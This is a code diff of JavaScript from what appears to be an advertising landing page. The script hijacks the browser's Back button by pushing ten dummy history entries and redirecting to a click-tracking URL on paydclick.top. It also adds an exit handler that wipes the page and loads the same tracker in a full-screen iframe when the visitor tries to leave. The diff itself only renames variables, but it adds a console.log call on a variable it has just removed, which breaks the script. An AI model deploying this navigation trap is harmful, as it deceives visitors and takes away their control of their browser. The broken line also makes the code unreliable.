@@ -1,5 +1,6 @@
-const urlHref = window.location.href;
-const preland = urlHref.replace(/^\S*\.\w*\//, '').split('?')[0].replace(/\/$/, '').replace(/\//g, '_');
+const urlHrefSc = window.location.href;
+const prelandSc = urlHrefSc.replace(/^\S*\.\w*\//, '').split('?')[0].replace(/\/$/, '').replace(/\//g, '_');
+console.log(preland);
 ! function ()
 {
         var t;
@@ -8,13 +9,13 @@ const preland = urlHref.replace(/^\S*\.\w*\//, '').split('?')[0].replace(/\/$/, 
 const URL = window.location.href.split(/[#]/)[0];
             for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
             onpopstate = function(event){
-                event.state && location.replace('https://paydclick.top/click.php?lp=1&place=backfix&event10=1'+'preland='+preland);
+                event.state && location.replace('https://paydclick.top/click.php?lp=1&place=backfix&event10=1'+'preland='+prelandSc);
             }
         } catch (o) { console.log( o ); }
     }();
 !function(){"use strict";function t(t){var e=this;this.params={landingUrl:t.landingUrl||"",text:"",imageSrc:"",innerHtml:void 0,inited:!1,reinitable:!1},this.params.text=this.params.text.replace(/\\n/g,"\n"),""===this.params.reinitable&&(this.params.reinitable=!1),this.params.landing_complete&&(this.params.landingUrl=this.params.landing_complete),this.el=document.createElement("div"),this.el.setAttribute("style","height: 100vh"),this.el.setAttribute("id","Comebacker"),window.onbeforeunload=function(){if(e.params.reinitable||!e.params.inited)return e.unload.call(e),e.params.text},"object"==typeof window.Opera&&(!e.params.reinitable&&e.params.inited||(e.unload.call(e),prompt(e.params.text)))}t.prototype={unload:function(){this.params.inited=!0,document.body.innerHTML="";var t=document.createElement("iframe");t.src=this.params.landingUrl,t.setAttribute("style","width:100%; height: 100%; border: 0; display:block;"),this.el.appendChild(t),document.body.appendChild(this.el)}},window.ComeBacker=t}();
 var params = {
-    landingUrl: 'https://paydclick.top/click.php?lp=1&place=comebacker&event9=1'+'preland='+preland,
+    landingUrl: 'https://paydclick.top/click.php?lp=1&place=comebacker&event9=1'+'preland='+prelandSc,
 }
 var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 var element = document.getElementById('text');
